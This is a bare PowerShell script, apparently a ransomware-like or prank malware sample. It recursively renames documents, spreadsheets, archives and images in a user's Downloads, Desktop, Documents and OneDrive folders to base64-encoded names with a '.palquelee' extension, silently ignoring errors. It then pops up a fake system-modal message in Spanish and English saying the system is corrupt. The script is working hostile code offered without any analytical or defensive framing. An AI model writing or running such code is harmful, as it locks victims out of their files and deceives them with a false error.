$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".svg");
$final_ext = ".palquelee"
$user_dirs = "(Downloads|Desktop|Documents)";
$base_dirs = @("$Env:USERPROFILE", "$Env:OneDrive");
foreach($base in $base_dirs){
    if([string]::IsNullOrEmpty($base)){continue}
    Get-ChildItem -Path $base | ForEach-Object {
        if($_.Name -match $user_dirs){
            Get-ChildItem -Recurse -Path $_.FullName | ForEach-Object {
                if($ext.Contains($_.Extension.ToLower() )){
                    try{
                        Rename-Item -Path $_.FullName -NewName ($_.DirectoryName + "\" + ([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_.Name)) -replace "=","") + $final_ext);
                    }catch{}
                }
            }
        }
    };
}
Add-Type -AssemblyName Microsoft.VisualBasic;[Microsoft.VisualBasic.Interaction]::MsgBox("Ocurrió un error, el sistema esta corrupto.`nThere is an error the system is corrupt.",'OKOnly,SystemModal,Critical', 'ERROR') *> $null;
